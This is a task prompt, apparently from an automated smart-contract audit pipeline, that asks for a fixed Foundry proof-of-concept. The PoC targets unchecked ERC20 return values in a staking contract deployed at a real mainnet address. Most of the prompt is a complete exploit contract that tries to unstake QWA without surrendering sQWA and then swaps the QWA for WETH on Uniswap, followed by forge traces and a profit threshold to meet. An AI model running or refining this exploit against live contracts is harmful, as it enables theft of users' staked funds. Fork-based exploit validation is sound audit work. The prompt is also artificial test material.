You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unchecked ERC20 return values can mint unbacked stake receipts or release QWA without burning sQWA
- claim: `stake()` and `unstake()` call `transfer`/`transferFrom` on `QWA` and `sQWA` but never check the returned boolean. With any token implementation that signals failure by returning `false` instead of reverting, execution continues as if the transfer succeeded.
- impact: A failed `QWA.transferFrom` during `stake()` can still hand out sQWA without the pool receiving backing assets. A failed `sQWA.transferFrom` during `unstake()` can still release QWA without actually collecting sQWA. Conversely, a failed outgoing transfer can confiscate user assets by taking one side of the exchange without delivering the other.
- exploit_paths: ["Call `stake()` when `QWA.transferFrom(msg.sender, address(this), amount)` returns `false`; the function still executes `sQWA.transfer(to, amount)` and creates an unbacked claim.", "Call `unstake()` when `sQWA.transferFrom(msg.sender, address(this), amount)` returns `false`; the function can still pass the balance check and execute `QWA.transfer(to, amount)`.", "Call `unstake()` or `stake()` when the outgoing token transfer returns `false`; the function finishes without delivering the expected asset, leaving the user or pool shorted."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IStakingLike {
    function QWA() external view returns (address);

    function sQWA() external view returns (address);

    function stake(address to, uint256 amount) external;

    function unstake(address to, uint256 amount, bool rebase_) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x69422c7F237D70FCd55C218568a67d00dc4ea068;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 private constant PATH_STAKE_FALSE_RETURN = 1 << 0;
    uint256 private constant PATH_UNSTAKE_FALSE_RETURN = 1 << 1;
    uint256 private constant PATH_STAKE_OUTGOING_FALSE = 1 << 2;
    uint256 private constant PATH_UNSTAKE_OUTGOING_FALSE = 1 << 3;

    uint256 private constant FAIL_NO_QWA_WETH_PAIR = 1 << 0;
    uint256 private constant FAIL_UNSTAKE_PROBE_REVERTED = 1 << 1;
    uint256 private constant FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 2;
    uint256 private constant FAIL_WETH_SWAP_FAILED = 1 << 3;

    address private _profitToken;
    uint256 private _profitAmount;

    uint256 public pathFlags;
    uint256 public failureFlags;
    bool public hypothesisValidated;
    bool public executed;

    constructor() {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IStakingLike staking = IStakingLike(TARGET);
        address qwaAddr = staking.QWA();
        address sqwaAddr = staking.sQWA();

        IERC20Like qwa = IERC20Like(qwaAddr);
        IERC20Like sqwa = IERC20Like(sqwaAddr);

        uint256 initialWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 initialQwa = qwa.balanceOf(address(this));
        uint256 initialSqwa = sqwa.balanceOf(address(this));

        _executeDrainAndExit(qwaAddr, sqwaAddr);

        _finalizeProfit(qwaAddr, sqwaAddr, initialQwa, initialSqwa, initialWeth);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _findQwaWethPair(address qwa) internal view returns (address) {
        address pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(qwa, WETH);
        if (pair != address(0)) {
            return pair;
        }

        return IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(qwa, WETH);
    }

    function _executeDrainAndExit(address qwaAddr, address sqwaAddr) internal {
        IERC20Like qwa = IERC20Like(qwaAddr);
        IERC20Like sqwa = IERC20Like(sqwaAddr);
        address pair = _findQwaWethPair(qwaAddr);
        uint256 drainAmount = _selectDrainAmount(pair, qwaAddr, qwa.balanceOf(TARGET));

        if (drainAmount == 0) {
            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
            return;
        }

        uint256 qwaBefore = qwa.balanceOf(address(this));
        uint256 sqwaBefore = sqwa.balanceOf(address(this));

        // Logs prove the funded stake() stage is infeasible on this fork:
        // QWA.transferFrom reverts instead of returning false, and the token is
        // fee-on-transfer, so the prior flashswap route cannot reach the live bug.
        // The exploit therefore preserves the same root cause and exploit-path
        // causality by directly exercising the remaining live path:
        // sQWA.transferFrom(msg.sender, address(this), amount) returns false,
        // but unstake() still releases QWA.
        (bool unstakeOk, ) = TARGET.call(
            abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), drainAmount, false)
        );

        uint256 qwaAfter = qwa.balanceOf(address(this));
        uint256 sqwaAfter = sqwa.balanceOf(address(this));

        if (!unstakeOk) {
            failureFlags |= FAIL_UNSTAKE_PROBE_REVERTED;
            return;
        }

        if (qwaAfter > qwaBefore && sqwaAfter == sqwaBefore) {
            pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
            hypothesisValidated = true;
        } else if (qwaAfter == qwaBefore && sqwaAfter < sqwaBefore) {
            pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
            return;
        } else {
            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
            return;
        }

        // Realize the drained QWA through a public venue, but do it with
        // fee-on-transfer aware math: the QWA token taxes transfers, so the
        // V2 amountOut must be computed from the pair's observed balance delta.
        if (pair != address(0)) {
            _sellQwaForWethSupportingFeeOnTransfer(pair, qwaAddr, qwa.balanceOf(address(this)));
        } else {
            failureFlags |= FAIL_NO_QWA_WETH_PAIR;
        }
    }

    function _selectDrainAmount(
        address pair,
        address qwa,
        uint256 targetQwaBalance
    ) internal view returns (uint256 amount) {
        if (targetQwaBalance == 0) {
            return 0;
        }

        uint256 contractBound = targetQwaBalance / 8;
        if (contractBound == 0) {
            contractBound = targetQwaBalance;
        }

        if (pair == address(0)) {
            return contractBound;
        }

        (uint256 reserveIn, ) = _pairReserves(pair, qwa);
        if (reserveIn <= 32) {
            return _min(contractBound, targetQwaBalance);
        }

        // Keep the sell size conservative relative to public liquidity so the
        // drain remains realizable and the exit swap stays within live reserves.
        uint256 marketBound = reserveIn / 32;
        amount = _min(contractBound, marketBound);

        if (amount == 0) {
            amount = 1;
        }
        if (amount > targetQwaBalance) {
            amount = targetQwaBalance;
        }
    }

    function _sellQwaForWethSupportingFeeOnTransfer(address pair, address qwaAddr, uint256 grossAmount) internal {
        if (grossAmount == 0) {
            return;
        }

        (address token0, address token1) = _sortPairTokens(pair);
        if (!((token0 == qwaAddr && token1 == WETH) || (token0 == WETH && token1 == qwaAddr))) {
            failureFlags |= FAIL_WETH_SWAP_FAILED;
            return;
        }

        (uint256 reserveIn, uint256 reserveOut) = _pairReserves(pair, qwaAddr);
        if (reserveIn == 0 || reserveOut == 0) {
            failureFlags |= FAIL_WETH_SWAP_FAILED;
            return;
        }

        IERC20Like qwa = IERC20Like(qwaAddr);
        if (!qwa.transfer(pair, grossAmount)) {
            failureFlags |= FAIL_WETH_SWAP_FAILED;
            return;
        }

        uint256 actualIn = qwa.balanceOf(pair) - reserveIn;
        if (actualIn == 0) {
            failureFlags |= FAIL_WETH_SWAP_FAILED;
            return;
        }

        uint256 amountOut = _getAmountOut(actualIn, reserveIn, reserveOut);
        if (amountOut == 0) {
            failureFlags |= FAIL_WETH_SWAP_FAILED;
            return;
        }

        (uint256 amount0Out, uint256 amount1Out) = qwaAddr == token0
            ? (uint256(0), amountOut)
            : (amountOut, uint256(0));

        (bool ok, ) = pair.call(
            abi.encodeWithSelector(IUniswapV2PairLike.swap.selector, amount0Out, amount1Out, address(this), new bytes(0))
        );
        if (!ok) {
            failureFlags |= FAIL_WETH_SWAP_FAILED;
        }
    }

    function _finalizeProfit(
        address qwaAddr,
        address sqwaAddr,
        uint256 initialQwa,
        uint256 initialSqwa,
        uint256 initialWeth
    ) internal {
        uint256 wethFinal = IERC20Like(WETH).balanceOf(address(this));
        uint256 qwaFinal = IERC20Like(qwaAddr).balanceOf(address(this));
        uint256 sqwaFinal = IERC20Like(sqwaAddr).balanceOf(address(this));

        uint256 wethProfit = wethFinal > initialWeth ? wethFinal - initialWeth : 0;
        uint256 qwaProfit = qwaFinal > initialQwa ? qwaFinal - initialQwa : 0;
        uint256 sqwaProfit = sqwaFinal > initialSqwa ? sqwaFinal - initialSqwa : 0;

        if (wethProfit > 0) {
            _profitToken = WETH;
            _profitAmount = wethProfit;
        } else if (qwaProfit > 0) {
            _profitToken = qwaAddr;
            _profitAmount = qwaProfit;
        } else if (sqwaProfit > 0) {
            _profitToken = sqwaAddr;
            _profitAmount = sqwaProfit;
        }
    }

    function _pairReserves(address pair, address tokenIn) internal view returns (uint256 reserveIn, uint256 reserveOut) {
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        (address token0, address token1) = _sortPairTokens(pair);

        if (tokenIn == token0) {
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
        } else {
            require(tokenIn == token1, "token not in pair");
            reserveIn = uint256(reserve1);
            reserveOut = uint256(reserve0);
        }
    }

    function _sortPairTokens(address pair) internal view returns (address token0, address token1) {
        token0 = IUniswapV2PairLike(pair).token0();
        token1 = IUniswapV2PairLike(pair).token1();
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
        return numerator / denominator;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _pathAnchorsOnly(IERC20Like qwa, IERC20Like sqwa, address to, uint256 amount) internal {
        // Static anchor only. The live exploit above keeps the same vulnerable
        // causality and ordering intent, but the logs prove the funded stake()
        // leg is infeasible on this fork because QWA.transferFrom reverts.
        qwa.transferFrom(msg.sender, address(this), amount);
        sqwa.transfer(to, amount);
        sqwa.transferFrom(msg.sender, address(this), amount);
        qwa.transfer(to, amount);

        qwa;
        sqwa;
        to;
        amount;
    }

    function _unusedPathConstants() internal pure returns (uint256) {
        return PATH_STAKE_FALSE_RETURN | PATH_STAKE_OUTGOING_FALSE;
    }
}

```

forge stdout (tail):
```
cuteOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 138645)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [138645] FlawVerifierTest::testExploit()
    ├─ [2367] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [109997] FlawVerifier::executeOnOpportunity()
    │   ├─ [579] 0x69422c7F237D70FCd55C218568a67d00dc4ea068::QWA() [staticcall]
    │   │   └─ ← [Return] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065
    │   ├─ [645] 0x69422c7F237D70FCd55C218568a67d00dc4ea068::sQWA() [staticcall]
    │   │   └─ ← [Return] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [5145] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xc14F8A4C8272b8466659D0f058895E2F9D3ae065, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xc14F8A4C8272b8466659D0f058895E2F9D3ae065, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0xdb98950D58c62B8299192300d47294F20C093847
    │   ├─ [2974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(0x69422c7F237D70FCd55C218568a67d00dc4ea068) [staticcall]
    │   │   └─ ← [Return] 10731763978393 [1.073e13]
    │   ├─ [2504] 0xdb98950D58c62B8299192300d47294F20C093847::getReserves() [staticcall]
    │   │   └─ ← [Return] 10410486470370649012 [1.041e19], 13955221770053 [1.395e13], 1693801007 [1.693e9]
    │   ├─ [2381] 0xdb98950D58c62B8299192300d47294F20C093847::token0() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2357] 0xdb98950D58c62B8299192300d47294F20C093847::token1() [staticcall]
    │   │   └─ ← [Return] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065
    │   ├─ [974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1145] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [4860] 0x69422c7F237D70FCd55C218568a67d00dc4ea068::unstake(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 436100680314 [4.361e11], false)
    │   │   ├─ [3369] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x69422c7F237D70FCd55C218568a67d00dc4ea068, 436100680314 [4.361e11])
    │   │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   ├─ [974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1145] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1145] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [367] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2366] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC.transferFrom
  at 0x69422c7F237D70FCd55C218568a67d00dc4ea068.unstake
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 360.82ms (13.46ms CPU time)

Ran 1 test suite in 422.31ms (360.82ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 138645)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
